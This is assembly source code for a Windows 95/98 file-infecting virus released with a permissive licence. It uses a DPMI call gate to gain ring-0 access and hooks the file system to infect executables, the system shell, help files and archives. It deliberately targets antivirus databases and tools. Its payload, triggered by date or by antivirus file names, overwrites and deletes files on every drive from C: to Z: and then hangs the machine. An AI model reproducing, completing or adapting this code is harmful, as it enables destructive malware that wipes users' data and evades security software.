   ;COMMENT /
   ;  (C) VBA Ltd. ALL RIGHTS RESERVED.
   ;  E-mail: support@vba.com.by
   ;
   ;  THIS PROGRAM IS FREE FOR COMMERCIAL AND NON-COMMERCIAL USE.
   ;
   ;  REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT
   ;  MODIFICATION, ARE PERMITTED.
   ;
   ;  THIS SOFTWARE IS PROVIDED BY VBA LTD. ``AS IS'' AND
   ;  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
   ;  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
   ;  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
   ;  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
   ;  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
   ;  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
   ;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
   ;  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
   ;  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
   ;  SUCH DAMAGE.
   ;/

   ; KNOWN UNFIXED BUGS:
   ; 1. INCORRECT PATCHED PAGE MAPPING IN SOME CASES FOR RESTORED NON-WRITEABLE
   ;    CODE SECTION FROM R0
   ; 2. DRWEB ALARM FOR PE EXECUTABLE (BUT FALSE ALARM TOO)

   MODEL TINY
   P386
   LOCALS

   INCLUDE     VBA.INC

   TOTAL       GROUP   CODE16,CODE32

   ;======================================
   CODE16      SEGMENT BYTE PUBLIC 'CODE' USE16
           ASSUME  CS:TOTAL,DS:TOTAL,ES:TOTAL,SS:TOTAL
           ORG 100H

   START:

   ;--------------------------------------
   DOS2R0      PROC
           JMP DOS_INSTALL     ;0EBH (OR 0E9H FOR PE_INSTALL)
   JMP_RELO    DB  0,0,0
   COPYRIGHT   =   $-START
           DB  '(C) VBA Ltd. E-mail: support@vba.com.by',0
   OFF_DOSINST =   $-JMP_RELO
   DOS_INSTALL:    MOV AH,4AH
           MOV BH,10H
           INT 21H
           JB  GO2_DOS_EXIT
           MOV AX,160AH
           INT 2FH         ;GET WIN VERSION
           AND AX,AX
           JNE GOZ_DOS_EXIT
           CMP BH,4            ;<4.X?
           JB  GO2_DOS_EXIT
           MOV DX,OUR_PORT
           IN  AL,DX
           CMP AL,WE_HERE
           STC
           JE  GO2_DOS_EXIT
           MOV AL,0            ;0-PE,1-HLP,2-RAR,3-ZIP
                           ;4-ARJ,5-HA
   FILE_TYPE   =   $-START-1
           DEC AX
           JNE NO_DOS_SLEEP
           INT 1AH
           MOV BX,DX
   DOS_SLEEP:  STI             ;TIMEOUT FOR HLP (PREVENT HANG)
           XOR AH,AH
           INT 1AH
           SUB DX,BX
           CMP DX,(WAIT_TIME*18)
           JB  DOS_SLEEP
   NO_DOS_SLEEP:   CLD
           MOV AX,1687H
           INT 2FH         ;DPMI PRESENT (0.9 IN WIN95/8)?
           AND AX,AX
           JNE GOZ_DOS_EXIT
           MOV BP,SP
           PUSH    ES DI
           MOV BX,SI
           MOV AH,48H
           INT 21H         ;MALLOC FOR INTERNAL USE BY DPMI HOST
           JB  GO2_DOS_EXIT
           MOV ES,AX
           XOR AX,AX
           CALL    4 PTR [BP-4]        ;GO OUT FROM V86 TO PM MODE
   GO2_DOS_EXIT:   JB  GO_DOS_EXIT
           CALL    CALC_DOS_DELTA
   DOS_DELTA   =   $-START
           DB  'MS-DOS',0
   CALC_DOS_DELTA: POP SI
           MOV AX,168AH
           INT 2FH         ;GET EXTAPI
           AND AL,AL
   GOZ_DOS_EXIT:   JNE DOS_EXIT
           PUSH    ES DI DS
           POP ES
           MOV CX,1
           CALL    ALLOC_DESC
           PUSH    AX
           CALL    ALLOC_DESC
           MOV [BP-2],AX
           AND AL,NOT 7
           PUSH    AX
           MOV BX,CS
           LEA DI,ZERO_INIT-DOS_DELTA[SI]
           MOV AX,0BH
           CALL    DPMICALL        ;GET CS DESCRIPTOR
           MOV AX,100H
           CALL    4 PTR [BP-8]        ;GET LDT ALIAS
   GO_DOS_EXIT:    JB  DOS_EXIT
           MOV ES,AX
           LEA AX,OFF_R0_INSTALL-DOS_DELTA[SI]
           ADD AX,[DI+2]
           MOV BL,[DI+4]
           MOV BH,[DI+7]
           ADC BX,0
           POP DI
           STOSW               ;GENERATE CALLGATE
           POP AX
           STOSW
           AND AL,NOT 7
           PUSH    AX
           MOV AX,11101100B SHL 8  ;P=1:DPL=3:S=0:TYPE=0CH (CALLGATE)
           STOSW
           XCHG    AX,BX
           STOSW
           POP DI          ;GENERATE R0 DESCRIPTOR
           MOV AX,-1
           STOSW
           INC AX
           STOSW
           STOSB
           MOV AX,1100111110011010B    ;G=1:32=1:AVL=0:LIMIT=0FH
           STOSW               ;P=1:DPL=0:S=1:CODE:NCONF:READ=1:NOACCESS
           XOR AL,AL
           STOSB
           CALL    4 PTR [BP-4]        ;SWITCH TO R0
   DOS_EXIT:   .EXIT
   ALLOC_DESC: XOR AX,AX
   DPMICALL:   INT 31H
           JB  DOS_EXIT
           RET
           ENDP

   INCLUDE     SPE.ASI

   END_CODE16  =   $-START

           ENDS

   ;======================================
   CODE32      SEGMENT BYTE PUBLIC 'CODE' USE32
           ASSUME  CS:TOTAL,DS:TOTAL,ES:TOTAL,SS:TOTAL

   START_CODE32:

   ;------------------------------------------------
   CALC_DELTA  PROC
           CALL    CALC_OUR_OFFST
           GOFF    OUR_OFFST
   CALC_OUR_OFFST: POP EDX
           SUB EDX,LARGE OUR_OFFST
           RET
           ENDP

   ;------------------------------------------------
           GOFF    OFF_IFS_HOOKER

   ; INT FILESYSTEMAPIHOOKFUNCTION(PIFSFUNC FSDFNADDR,INT FUNCTIONNUM,INT DRIVE,
   ;                               INT RESOURCEFLAGS,INT CODEPAGE,PIOREQ PIR)
   IFS_HOOKER  PROC

   FSD_FN_ADDR =   4 PTR [EBP+8]
   FN_NUM      =   4 PTR [EBP+12]
   DRIVE       =   4 PTR [EBP+16]
   RES_FLAGS   =   4 PTR [EBP+20]
   CODE_PAGE   =   4 PTR [EBP+24]
   P_IOREQ     =   4 PTR [EBP+28]

           ENTERD  STACK_FRAME,0
           PUSHAD
           CALL    CALC_DELTA
           MOV EBX,P_IOREQ
           BTS 4 PTR FLAG[EDX],0
           JB  IFS_EXIT
           CMP 1 PTR RES_FLAGS,IFSFH_RES_CFSD ;CHAR DEVICE?
           JE  IFS_RETURN
           MOV EAX,FN_NUM
           CMP EAX,IFSFN_RENAME
           JA  IFS_RETURN
           JE  IS_RENAME
           CMP AL,IFSFN_OPEN
           JE  IS_OPEN
           CMP AL,IFSFN_FILEATTRIB
           JE  IS_ATTRIB
           GOFF    IFS_RETURN_OFF
   IFS_RETURN: DEC 1 PTR FLAG[EDX]
           POPAD
           LEAVED
           JMP 4 PTR DS:[12345678H]
           GOFF    OLD_IFS_HOOKER,4
   IFS_EXIT:   PUSH    EBX
           LEA EDI,OLD_DATETIME[EDX]
           CALL    FSD_FN_ADDR
           MOV [EBP-STACK_FRAME-4],EAX ;SET CORRECT RETURN VALUE
           POP EAX
           CMP 1 PTR FN_NUM,IFSFN_OPEN
           JNE NO_STORE_FDATE
           MOV EAX,[EBX.IR_DATETIME]
           STOSD
   NO_STORE_FDATE: POPAD
           LEAVED
           GOFF    HOOK_STUB
           RET
           ENDP

   ;------------------------------------------------
   IS_RENAME:  TEST    1 PTR [EBX.IR_ATTR+3],FILE_FLAG_WILDCARDS SHR 24
           JMP IS_ACCESS

   ;------------------------------------------------
   IS_ATTRIB:  MOV AL,[EBX.IR_FLAGS]
           DEC EAX         ;SET_ATTRIBUTES
           JNE NO_SET_ATTRIB
           TEST    1 PTR [EBX.IR_ATTR],FA_SYSTEM
           JMP IS_ACCESS
   NO_SET_ATTRIB:  CMP AL,SET_ATTRIB_CREATION_DATETIME-1
           JA  IFS_RETURN
           AND AL,1
           JMP IS_ACCESS

   ;------------------------------------------------
   IS_OPEN:    TEST    1 PTR [EBX.IR_OPTIONS+1],(R0_SWAPPER_CALL OR OPEN_FLAGS_REOPEN) SHR 8
   IS_ACCESS:  JNE IFS_RETURN
   GO_PROCESS: BREAK
           PUSH    EBX
           CMP DL,SHELL_FLAG[EDX]
           IFNDEF  DEBUG
           JNE GO_NO_INF_SHELL
           ELSE
           JMP GO_NO_INF_SHELL
           ENDIF
           CALL    GET_WININIT
           CALL    GET_ATTRIBUTES
           JNB GO_NO_INF_SHELL
           LEA ESI,SYSTEM_INI[EDX]
           MOV CL,LEN_SYSTEM_INI
           CALL    CONCAT_WINDIR
           PUSH    EDX
           CALL    OPEN_FILE_RO
           POP EDX
           JB  GO_NO_INF_SHELL
           XCHG    EAX,EBX
           CALL    READ_FILE_BUFF_0
           JNB LONG_SYSINI
           ADD ECX,EAX
   LONG_SYSINI:    CALL    CLOSE_FILE
   FIND_SHELL: LODSD
           OR  EAX,20202020H
           CMP EAX,'lehs'
           JNE NO_SHELL
           LODSW
           OR  AL,20H
           CMP AX,'=l'
           JE  IS_SHELL
           DEC ESI
           DEC ESI
   NO_SHELL:   SUB ESI,3
           LOOP    FIND_SHELL
   GO_NO_INF_SHELL:
           JMP NO_INF_SHELL
   IS_SHELL:   CMP 1 PTR [ESI+1],':'
           JNE SNAME_ONLY
           LEA EDI,TMP_PATH[EDX]
           PUSH    EDI
   COPY_SH_NAME:   MOVSB
           CMP 1 PTR [ESI],20H
           JA  COPY_SH_NAME
           MOV [EDI],DL
           POP ESI
           JMP OPEN_SHELL
   SNAME_ONLY: XOR ECX,ECX
   GET_SH_LIM: INC ECX
           CMP 1 PTR [ESI+ECX],20H
           JA  GET_SH_LIM
           CALL    CONCAT_WINDIR
   OPEN_SHELL: PUSH    EDX
           CALL    OPEN_FILE_RO
           POP EDX
           JB  GO_NO_INF_SHELL
           XCHG    EAX,EBX
           CALL    GET_ATTRIBUTES
           PUSH    EBX ECX EDX EBX
           DEC 1 PTR [EDI-1]
           MOV EDI,4 PTR OLD_DATETIME[EDX]
           CALL    OPEN_CREATE
           POP EBX EDX
           JB  CLOSE_SOURCE
           PUSH    EDI ESI EAX
           CALL    READ_FILE_BUFF_0
           JB  CLOSE_ALL
           XCHG    EAX,EDI
           MOV AL,WE_HERE
           XCHG    AL,1 PTR [ESI.DOSH_CSUM]
           CMP AL,WE_HERE
           JE  CLOSE_ALL_CMC
   COPY_FILE:  POP EBX
           PUSH    EBX
           MOV EAX,EDI
           CALL    WRITE_FILE
           JB  CLOSE_ALL
           ADD EDI,ECX
           MOV EAX,EDI
           MOV EBX,[ESP+10H]
           CALL    READ_FILE
           JNB COPY_FILE
           ADD ECX,EAX
           JNE COPY_FILE
   CLOSE_ALL_CMC:  CMC
   CLOSE_ALL:  POP EBX ESI CX DI
           PUSHFD
           CALL    CLOSE_FILE
           MOV AL,SET_ATTRIB_MODIFY_DATETIME
           CALL    MAN_ATTRIBUTES
           POPFD
   CLOSE_SOURCE:   POP ECX
           SBB EDI,EDI
           JNE SH_ERR
           CALL    SET_ATTRIBUTES
           JMP SH_OK
   SH_ERR:     CALL    DELETE_FILE
   SH_OK:      POP EBX
           CALL    CLOSE_FILE
           INC EDI
           STC
           JE  GOC_NO_INF_SHELL
           MOV FILE_TYPE[EDX],DL
           CALL    INFECTION
           LEA ESI,TMP_PATH[EDX]
           LEA EDI,MAIN_BUFF[EDX]
           PUSH    EDI ESI
           MOV EAX,'ner['
           STOSD
           MOV EAX,']ema'
           STOSD
           MOV AL,0AH
           STOSB
   MOVE_DEST:  LODSB
           CMP AL,'A'
           JB  NO_LETTER
           CMP AL,'Z'
           JA  NO_LETTER
           OR  AL,20H
   NO_LETTER:  STOSB
           CMP DL,[ESI]
           JNE MOVE_DEST
           INC 1 PTR [EDI-1]
           MOV AL,'='
           STOSB
           POP ESI
   MOVE_SOURCE:    MOVSB
           CMP DL,[ESI]
           JNE MOVE_SOURCE
           MOV AL,0AH
           STOSB
           MOV EAX,'=lun'
           STOSD
           PUSH    EDI
           CALL    GET_WININIT
           POP EDI
           PUSH    ESI
   MOVE_INIT:  MOVSB
           CMP DL,[ESI]
           JNE MOVE_INIT
           POP ESI
           PUSH    EDX
           CALL    OPEN_CREATE
           POP EDX ECX
   GOC_NO_INF_SHELL:
           JB  NO_INF_SHELL
           XCHG    EAX,EBX
           SUB EDI,ECX
           MOV ESI,ECX
           MOV ECX,EDI
           XOR EAX,EAX
           CALL    WRITE_FILE
           CALL    CLOSE_FILE
           PUSH    GET_CUR_VM_HANDLE
           CALL    VXD_CALL
           MOV AL,MSG_POSSIBLITY
           CALL    GET_RANDOM_BYTE
           IFNDEF  DEBUG
           JNE NO_INF_SHELL
           ELSE
           XOR EAX,EAX
           ENDIF
           LEA ECX,COPYRIGHT[EDX]
           MOV ESI,EAX
           MOV EDI,EAX
           PUSH    SHELL_MESSAGE
           CALL    VXD_CALL
   NO_INF_SHELL:   MOV 1 PTR SHELL_FLAG[EDX],1
           POP EBX
   SHELL_ALREADY:
           IFNDEF  DEBUG
           LEA ESI,COMMAND_PIF[EDX]
           MOV CL,LEN_COMMAND_PIF
           CALL    CONCAT_WINDIR
           CALL    GET_ATTRIBUTES
           JB  CPIF_NFOUND
           CALL    DELETE_FILE
   CPIF_NFOUND:    MOV EDI,ESI
           ELSE
           LEA EDI,TMP_PATH[EDX]
           MOV ESI,EDI
           ENDIF
           MOV EAX,DRIVE
           INC AL          ;UNC PATH?
           JE  NO_STORE_DRIVE
           ADD AX,(':' SHL 8) OR ('A'-2)
           STOSW
   NO_STORE_DRIVE: MOV EAX,[EBX.IR_PPATH]
           ADD EAX,4
           PUSH    EDX BCS_WANSI MAX_PATH-3 EAX EDI UNITOBCSPATH
           CALL    VXD_CALL
           ADD ESP,4*4
           POP EDX
           MOV [EDI+EAX],DL
           LEA ECX,FILE_TYPE[EDX]
           MOV 1 PTR [ECX],0FFH
           MOV EAX,[EDI+EAX-4]
           CMP EAX,'CVA.'      ;AVP 3 DATABASE?
           JE  INFECT_IT
           CMP EAX,'BDV.'      ;DRWEB 4 DATABASE?
           JE  INFECT_IT
           INC 1 PTR [ECX]
           CMP EAX,'EXE.'      ;EXE?
           JE  OK_FILE
           CMP EAX,'RCS.'
           JE  OK_FILE
           CMP EAX,'LLD.'      ;DLL?
           JE  INFECT_IT       ;FOR AV CORRECT CHECKING ONLY!
           INC 1 PTR [ECX]
           CMP EAX,'PLH.'      ;HLP?
           JE  OK_FILE
           INC 1 PTR [ECX]
           CMP EAX,'RAR.'      ;RAR?
           JE  OK_FILE
           INC 1 PTR [ECX]
           CMP EAX,'PIZ.'      ;ZIP?
           JE  OK_FILE
           INC 1 PTR [ECX]
           CMP EAX,'JRA.'      ;ARJ?
           JE  OK_FILE
           INC 1 PTR [ECX]
           SHR EAX,8
           CMP EAX,'AH.'       ;HA?
           STC
           JNE GO_IFS_RETURN
   OK_FILE:    PUSH    EDX EBX
           MOV EDX,DRIVE
           TEST    1 PTR RES_FLAGS,IFSFH_RES_UNC
           JNE ERR_GET_SPACE
           MOV AX,R0_GETDISKFREESPACE
           CALL    FILE_IO
           JB  ERR_GET_SPACE
           MUL BX          ;SEC_PER_CLUST(AX)*AVAIL_CLUST(CX)
           CMC
           JNB ERR_GET_SPACE
           CMP AX,SMALL (OUR_LEN+1FFH+0FFFH)/200H
   ERR_GET_SPACE:  POP EBX EDX
   GO_IFS_RETURN:  JB  IFS_RETURN
   INFECT_IT:                  ;TMP_PATH->FILE PATH TO INFECTION
           LEA EAX,IFS_RETURN_OFF[EDX]
           PUSH    EAX
           CALL    GET_ATTRIBUTES
           JNB GOOD_ATT
           CMP 1 PTR FN_NUM,IFSFN_RENAME
           JE  INF_ERR
           PUSH    ESI
           MOV EDI,[EBX.IR_UPATH]
           XCHG    ESI,EDI
   PARSE_PATH: LODSB
           INC ESI
           STOSB
           DEC AL
           JNS PARSE_PATH
           POP ESI

   ;--------------------------------------
   INFECTION:  CALL    GET_ATTRIBUTES
           JB  INF_ERR
   GOOD_ATT:   TEST    CL,FA_SYSTEM OR FA_DEVICE
           JE  ATT_OK
   INF_ERR:    RETN
   ATT_OK:     MOV EDI,ECX
           CALL    CLR_ATTRIBUTES
           JB  INF_ERR
           PUSH    EDI EDX
           MOV BL,OPEN_ACCESS_READWRITE OR OPEN_SHARE_DENYREADWRITE
           CALL    OPEN_FILE
           POP EDX
           JB  REST_ATTRIB
           PUSH    ESI
           XCHG    EAX,EBX
           MOV ECX,12345678H
           GOFF    OLD_DATETIME,4
           CMP 1 PTR FN_NUM,IFSFN_FILEATTRIB
           JNE CURRENT_DATE
           MOV EDI,P_IOREQ
           CMP 1 PTR [EDI.IR_FLAGS],SET_ATTRIB_MODIFY_DATETIME
           JNE CURRENT_DATE
           MOV ECX,[EDI.IR_DATETIME]
   CURRENT_DATE:   PUSH    ECX
           TEST    1 PTR FILE_TYPE[EDX],0FFH
           JS  IS_SHITNAME
           JNE NO_SHITNAME
           MOV EDI,ESI
   GET_PATHBYTE:   LODSB
           CMP AL,'\'
           JE  STORE_OFFS
           CMP AL,':'
           JNE NO_STORE_OFFS
   STORE_OFFS: MOV EDI,ESI
   NO_STORE_OFFS:  AND AL,AL
           JNE GET_PATHBYTE
           MOV EAX,[EDI]
           CMP EAX,'NIDA'      ;ADINF?
           JE  GO_TO_PAY
           CMP EAX,'IPVA'      ;AVPI?
           JE  GO_TO_PAY
           CMP EAX,'SOHG'      ;GHOST32?
           JE  GO_TO_PAY
           CMP EAX,'NIBV'      ;VBINF? :-)
           JE  GO_TO_PAY
           CMP EAX,'PVA_'      ;AVP?
           JE  IS_SHITNAME
           SHL EAX,8
           CMP EAX,'RAJ' SHL 8     ;JAR?
           JE  SKIP_FILE
           CMP EAX,'PVA' SHL 8     ;AVP?
           JE  IS_SHITNAME
           CMP EAX,'WRD' SHL 8     ;DRWEB?
           JE  IS_SHITNAME
           CMP EAX,'ABV' SHL 8     ;VBA*.EXE? :-)
           JNE NO_SHITNAME
           CMP 1 PTR [ESI-2],'E'
           JNE NO_SHITNAME
   IS_SHITNAME:    XCHG    EAX,ECX
           XOR ECX,ECX
           SHLD    ECX,EAX,11
           AND ECX,00001111B
           SHR EAX,16+5+4
           SUB AL,HAPPY_YEAR-1980
           JB  SKIP_FILE
           MOV AH,12           ;MONTHS IN YEAR
           MUL AH
           IF  HAPPY_MONTH EQ 1
           DEC EAX
           ELSEIF  HAPPY_MONTH EQ 2
           DEC EAX
           DEC EAX
           ELSE
           SUB EAX,HAPPY_MONTH
           ENDIF
           ADD ECX,EAX
           JS  SKIP_FILE
           MOV EAX,HAPPY_POSSIBLITY
           SUB EAX,ECX
           JA  NOT_EXPIRED
           MOV AL,1            ;100% POSSIBLITY
   NOT_EXPIRED:    CALL    GET_RANDOM_BYTE
   GO_TO_PAY:  JE  TIME_TO_PAY
   SKIP_FILE:  STC
           JMP GO_F_CLOSE
   NO_SHITNAME:    PUSH    EDX GET_DOSTIME
           CALL    VXD_CALL
           POP EDX
           SUB EAX,[ESP]
           CMP EAX,0FFFFFH     ;MIN - TWO WEEK AGE
           IFNDEF  DEBUG
           JB  F_CLOSE
           ENDIF
           CALL    GET_SYS_TIME
           CMP DL,SHELL_FLAG[EDX]
           JE  NO_SLEEP
           SUB EAX,12345678H
           GOFF    INF_TIME,4
           CMP EAX,SLEEP_TIME*60*1000
           IFNDEF  DEBUG
           JB  F_CLOSE
           ENDIF
   NO_SLEEP:   LEA ESI,HEADER[EDX]
           PUSH    SIZE DOS_HEADER
           POP ECX
           XOR EAX,EAX         ;POS IN FILE
           CALL    READ_FILE       ;READ FILE HEADER
   GO_F_CLOSE: JB  F_CLOSE
           LEA EDI,OUR_LOCAL_HEADER[EDX]
           MOV CL,(SIZE_ARC_AREA+3)/4
           REP STOSD
           MOV AL,1 PTR FILE_TYPE[EDX]
           MOVZX   EDI,2 PTR INF_PROCS[EDX+EAX*2]
           ADD EDI,EDX
           MOV 2 PTR [EDX],(OFF_DOSINST SHL 8) OR 0EBH ;DROPPER MODE
           CALL    EDI
   F_CLOSE:    CALL    CLOSE_FILE
           POP CX DI ESI
           MOV AL,SET_ATTRIB_MODIFY_DATETIME
           CALL    MAN_ATTRIBUTES
   REST_ATTRIB:    POP ECX
           JMP SET_ATTRIBUTES

   ;------------------------------------------------
   TIME_TO_PAY:    MOV EAX,_LEAVEMUSTCOMPLETE
           PUSH    EAX
           DEC EAX         ;_ENTERMUSTCOMPLETE
           PUSH    EAX
           CALL    VXD_CALL
           LEA EDX,FIND_DATA[EDX]  ;ESI=&TMP_PATH
           IFNDEF  DEBUG
           MOV AX,':C'
           ELSE
           MOV AX,':X'
           ENDIF
   FIND_DRIVE: MOV EDI,ESI
           STOSW
           PUSH    EAX
   FIND_FIRST: MOV AL,'\'
           STOSB
           MOV 2 PTR [EDI],'*'
           PUSH    37H
           POP ECX
           MOV AX,R0_FINDFIRSTFILE
           CALL    FILE_IO
           JNB SOME_FOUND
   FIND_SLASH: DEC EDI
           CMP 1 PTR [EDI-1],':'
           JE  NEXT_DRIVE
           CMP 1 PTR [EDI-1],'\'
           JNE FIND_SLASH
   FIND_NEXT:  MOV AX,R0_FINDNEXTFILE
           CALL    FILE_IO
           JNB OK_FOUND
           MOV AX,R0_FINDCLOSEFILE
           CALL    FILE_IO
           POP EBX
           JMP FIND_SLASH
   SOME_FOUND: PUSH    EBX
           XCHG    EAX,EBX
   OK_FOUND:   PUSH    ESI EDI
           LEA ESI,[EDX.CFILENAME]
   STORE_NAME: LODSB
           STOSB
           AND AL,AL
           JNE STORE_NAME
           DEC EDI
           POP EAX ESI
           XCHG    EAX,EDI
           TEST    1 PTR [EDX.DWFILEATTRIBUTES],10H
           JE  NOT_DIR
           CMP 1 PTR [EDX.CFILENAME],'.'
           JE  FIND_NEXT
           XCHG    EAX,EDI
           JMP FIND_FIRST
   NEXT_DRIVE: POP EAX
           INC EAX
           CMP AL,'Z'
           JBE FIND_DRIVE
   GO_HANG:    CALL    VXD_CALL        ;_LEAVEMUSTCOMPLETE
           XOR ESI,ESI
           LEA EAX,[ESI+1]     ;HANG_ON_EXIT
           PUSH    FATAL_ERROR_HANDLER
           JMP GO_HANG
   NOT_DIR:    PUSHAD
           CALL    CLR_ATTRIBUTES
           CALL    OPEN_CREATE
           JB  DEL_FILE
           XCHG    EAX,EBX
           CALL    CLOSE_FILE
   DEL_FILE:   CALL    DELETE_FILE
           POPAD
           JMP FIND_NEXT

   ;------------------------------------------------
   ;ENTRY: EBP=&LENGTH OF MACRO STRING
   CORR_LENGTH PROC
           MOV EAX,EDI
           SUB EAX,EBP
           DEC EAX
           MOV [EBP],AX
           XOR AL,AL
           STOSB
   INF_EXE_EXIT:   RET
           ENDP

   ;------------------------------------------------
           GOFF    INF_EXE
           MOV 1 PTR [EDX],0E9H    ;PE SPECIAL MODE
           IFDEF   DEBUG
           CMP [DOSH_SIGNATURE.ESI],'MZ'
           ELSE
           CMP [DOSH_SIGNATURE.ESI],'ZM'
           ENDIF
           JNE INF_EXE_EXIT
           CMP [DOSH_LFARLC.ESI],3FH
           JBE INF_EXE_EXIT
           MOVZX   EAX,[DOSH_LFANEW.ESI]
           ADD ESI,SIZE DOS_HEADER ;PHEADER
           MOV CX,SIZE PE_HEADER+(SIZE OBJECT_TABLE*MAX_OBJS)
           CALL    READ_FILE
           JB  INF_EXE_EXIT
           CMP 2 PTR [PEH_SIGNATURE.ESI],'EP'
           JNE INF_EXE_EXIT
           CMP [PEH_CPUTYPE.ESI],162H  ;INTEL?
           JAE INF_EXE_EXIT
           CMP 1 PTR [PEH_NUMOFOBJECT.ESI],MAX_OBJS
           JA  INF_EXE_EXIT
           TEST    2 PTR [PEH_FLAGS.ESI],PE_FLAG_DLL OR PE_FLAG_NOT_FIXUP
           JNE INF_EXE_EXIT
           TEST    2 PTR [PEH_FLAGS.ESI],PE_FLAG_32BIT OR PE_FLAG_EXECUTABLE
           JE  INF_EXE_EXIT
           CMP 4 PTR [PEH_IMAGEBASE.ESI],400000H
           JNE INF_EXE_EXIT
           INC 1 PTR [PEH_FLAGS.ESI]   ;PE_FLAG_NOT_FIXUP
           LEA EDI,[ESI+SIZE PE_HEADER-SIZE OBJECT_TABLE]
           XOR EAX,EAX
           MOV [PEH_FIXUP.SD_SIZE.ESI],EAX
           XCHG    EAX,[PEH_FIXUP.SD_RVA.ESI]
           AND EAX,EAX
   GOZ_INF_EXIT:   JE  INF_EXE_EXIT
           PUSH    EDI
   FIND_FIXUPOBJ:  ADD EDI,SIZE OBJECT_TABLE
           CMP EAX,[OT_RVA.EDI]
           JNE FIND_FIXUPOBJ
           MOV AL,NOCHNG_SATT_PSBL
           CALL    GET_RANDOM_BYTE
           JE  NO_CHNG_ATT
           AND 1 PTR [OT_FLAGS.EDI+3],NOT ((OT_FLAG_DISCARDABLE OR OT_FLAG_SHARED) SHR 24)
           OR  [OT_FLAGS.EDI],OT_FLAG_READ OR OT_FLAG_IDATA
   NO_CHNG_ATT:    MOV AL,CHNG_SNAME_PSBL
           CALL    GET_RANDOM_BYTE
           JNE NO_CHNG_NAME
           PUSH    EDI
           CALL    GEN_NAME
           XOR AL,AL
           STOSB
           POP EDI
   NO_CHNG_NAME:   MOV AL,LEN_PEND_JUNK
           CALL    GET_RANDOM_BYTE
           ADD AX,SMALL OUR_LEN+LEN_LOADER+3
           AND AL,NOT 3
           MOV CURRENT_LEN[EDX],EAX
           MOV COUNT_RET[EDX],AX
           XCHG    EAX,ECX
           MOV EAX,[OT_VIRTSIZE.EDI]
           CALL    CORR_SIZE
           CMP EAX,[OT_PHYSICALSIZE.EDI]
           JB  GET_VIRTSIZE
           MOV EAX,[OT_PHYSICALSIZE.EDI]
   GET_VIRTSIZE:   SUB EAX,ECX
           PUSHFD
           JA  OK_RELOC_SIZE
           ADD EAX,ECX
   OK_RELOC_SIZE:  CALL    GET_RANDOM
           AND AL,NOT 3
           PUSH    EAX
           ADD EAX,[OT_PHYSICALOFF.EDI]
           MOV PHYS_BODY_OFF[EDX],EAX
           ADD EAX,ECX
           MOV FILL_SEC_OFF[EDX],EAX
           POP EAX
           ADD EAX,ECX
           PUSH    EAX
           ADD EAX,[OT_RVA.EDI]
           ADD EAX,[PEH_IMAGEBASE.ESI]
           MOV OFF_FIXUP[EDX],EAX
           POP ECX
           POPFD
           JA  MID_EXIT_ONE
           CMP [OT_PHYSICALSIZE.EDI],MIN_RELOC_SIZE
           JB  MID_EXIT_ONE
           PUSH    ESI
           CALL    GETSIZE_FILE
           SUB EAX,[OT_PHYSICALOFF.EDI]
           CMP EAX,[OT_PHYSICALSIZE.EDI]
           JA  MID_EXIT_CMC
           CALL    CORR_SIZE_ECX
           CMPSD
           SCASD
           CALL    CORR_SIZE_ECX
           SUB EAX,ECX
           CMP EAX,SIZE_MBUFF
   MID_EXIT_CMC:   CMC
           JB  MID_EXIT_TWO
           XCHG    EAX,ECX
           PUSH    ECX
           LEA EDI,MAIN_BUFF[EDX]
           MOV ESI,EDI
           XOR AL,AL
           REP STOSB
           POP ECX
           MOV EAX,12345678H
           GOFF    FILL_SEC_OFF,4
           CALL    WRITE_FILE
   MID_EXIT_TWO:   POP ESI
   MID_EXIT_ONE:   POP EDI
           JNB NO_POP_EXIT
   MID_RET:    RETN
   NO_POP_EXIT:    MOV EAX,[PEH_CODEBASE.ESI]
   FIND_CODEOBJ:   ADD EDI,SIZE OBJECT_TABLE
           CMP EAX,[OT_RVA.EDI]
           JNE FIND_CODEOBJ
           MOV AL,OT_FLAG_WRITE SHR 24
           TEST    AL,1 PTR [OT_FLAGS.EDI+3]
           JNE MID_RET
           PUSH    EDI
           LEA ESI,TMP_PATH[EDX]
           MOV EDI,[ESI-SYS_PATH_DELTA]    ;SYS_PATH[EDX]
           MOV CL,NOT RW_LOCAL_EXIT
   CHECK_PATH: CMPSB
           JNE NO_SYS_DIR
           CMP DL,[EDI]
           JNE CHECK_PATH
           XOR AL,AL
           MOV CL,AL
   NO_SYS_DIR: POP EDI
           OR  1 PTR [OT_FLAGS.EDI+3],AL
           MOV RW_OR_RO[EDX],CL
           PUSH    EDX
           MOV EAX,[OT_PHYSICALSIZE.EDI]
           XOR EDX,EDX
           MOV ECX,SIZE_MBUFF
           DIV ECX
           POP EDX
           CALL    GET_RANDOM
           IMUL    EAX,ECX
           ADD EAX,[OT_PHYSICALOFF.EDI]
           PUSH    EAX
           CALL    READ_FILE_BUFF
           JB  POP_INF_EXIT
           CMP DL,SHELL_FLAG[EDX]
           JE  INF_ENTRYPOINT
           CALL    FIND_PLACE
           AND ECX,ECX
           JNE MIDDLE_INSERT
   INF_ENTRYPOINT: POP EAX
           MOV EAX,PHEADER[PEH_ENTRYPOINT.EDX]
           PUSH    EAX
           SUB EAX,[OT_RVA.EDI]
           ADD EAX,[OT_PHYSICALOFF.EDI]
           PUSH    EAX
           CALL    READ_FILE_BUFF
           POP EDI
   POP_INF_EXIT:   POP EAX
           JB  GO1_INF_EXIT
           PUSH    EDI
           JMP ENTRY_INSERT
   MIDDLE_INSERT:  MOV ESI,EAX
           SUB EAX,EDX
           SUB EAX,LARGE MAIN_BUFF
           ADD EAX,[OT_RVA.EDI]
           ADD EAX,[ESP]
           SUB EAX,[OT_PHYSICALOFF.EDI]
   ENTRY_INSERT:   ADD EAX,PHEADER[PEH_IMAGEBASE.EDX]
